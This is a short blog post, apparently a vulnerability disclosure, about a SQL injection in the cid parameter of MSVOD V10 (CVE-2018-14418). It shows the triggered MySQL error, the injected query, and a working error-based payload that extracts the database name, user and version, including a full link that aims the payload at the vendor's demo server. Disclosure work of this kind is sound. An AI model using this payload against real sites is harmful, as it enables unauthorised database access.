+++
title = "MSVOD V10 – SQL Injection"
author = "Hzllaga"
date =  2018-07-17
description = "MSVOD V10 – SQL Injection via /images/lists The $cid parameter controllable."
categories = ["原创"]
tags = ["PHP","SQL注入"]

+++
MSVOD V10 – SQL Injection via /images/lists

The $cid parameter controllable.<!--more-->

Open the page:/images/lists?cid=’

Then SQL will be error:
{{< highlight sql >}}
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' or ms_atlas.class in (12,13,19,22,23,24,35)) ) LIMIT 1' at line 1
{{< /highlight >}}
And we can see that Error SQL  Statement:
{{< highlight sql >}}
SELECT COUNT(*) AS tp_count FROM `ms_atlas` WHERE ( ms_atlas.status = 1 and ms_atlas.is_check=1 and (ms_atlas.class = ' or ms_atlas.class in (12,13,19,22,23,24,35)) ) LIMIT 1
{{< /highlight >}}
So Final Payload:
{{< highlight sql >}}
/images/lists?cid=13%20)%20ORDER%20BY%201%20desc,extractvalue(rand(),concat(0x7c,database(),0x7c,user(),0x7c,@@version))%20desc%20--%20
{{< /highlight >}}
Official demo:

http://px.msvodx.com/images/lists?cid=13%20)%20ORDER%20BY%201%20desc,extractvalue(rand(),concat(0x7c,database(),0x7c,user(),0x7c,@@version))%20desc%20–%20

![](https://cdn.wtfsec.org/img/20200223164223.png)

CVE:[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-14418](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-14418)

Exploit-DB:[https://www.exploit-db.com/exploits/45062/](https://www.exploit-db.com/exploits/45062/)

